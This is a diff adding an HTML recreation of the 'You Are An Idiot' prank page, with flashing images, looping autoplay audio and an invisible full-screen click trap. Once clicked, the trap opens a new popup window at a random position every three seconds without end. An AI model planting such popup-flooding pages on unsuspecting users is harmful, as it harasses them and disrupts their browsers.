@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>You Are An Idiot</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: black;
+      height: 100%;
+      width: 100%;
+      font-family: sans-serif;
+      color: white;
+      overflow: hidden;
+    }
+    #clickbox {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      cursor: pointer; /* THIS makes the cursor a pointing hand */
+    }
+    #content {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      pointer-events: none; /* Prevents blocking the clickbox */
+    }
+    img {
+      width: 300px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 8px 16px;
+      font-size: 14px;
+      cursor: pointer;
+      z-index: 3;
+      pointer-events: auto; /* Allows mute button to be clickable */
+    }
+  </style>
+</head>
+<body>
+  <div id="clickbox"></div>
+
+  <div id="content">
+    <img id="idiotImage" src="idiot-black.png" alt="You Are An Idiot">
+    <button id="muteBtn">?? Mute</button>
+  </div>
+
+  <audio id="idiotAudio" autoplay loop>
+    <source src="idiot.ogg" type="audio/ogg">
+    <source src="idiot.wav" type="audio/wav">
+    Your browser does not support the audio element.
+  </audio>
+
+  <script>
+    const image = document.getElementById("idiotImage");
+    const audio = document.getElementById("idiotAudio");
+    const muteBtn = document.getElementById("muteBtn");
+    const clickbox = document.getElementById("clickbox");
+    const images = ["idiot-black.png", "idiot-white.png"];
+    let index = 0;
+    let popupIntervalStarted = false;
+
+    // Alternate image every 0.5 seconds
+    setInterval(() => {
+      index = (index + 1) % images.length;
+      image.src = images[index];
+    }, 500);
+
+    // Mute/unmute toggle
+    muteBtn.addEventListener("click", (e) => {
+      e.stopPropagation(); // Prevent popup trigger
+      audio.muted = !audio.muted;
+      muteBtn.textContent = audio.muted ? "?? Unmute" : "?? Mute";
+    });
+
+    // Start infinite popup loop on click
+    clickbox.addEventListener("click", () => {
+      if (!popupIntervalStarted) {
+        popupIntervalStarted = true;
+        setInterval(() => {
+          const w = 400;
+          const h = 300;
+          const left = Math.floor(Math.random() * (screen.width - w));
+          const top = Math.floor(Math.random() * (screen.height - h));
+          window.open("lol.html", "", `width=${w},height=${h},left=${left},top=${top}`);
+        }, 3000); // Change interval if needed
+      }
+    });
+  </script>
+</body>
+</html>
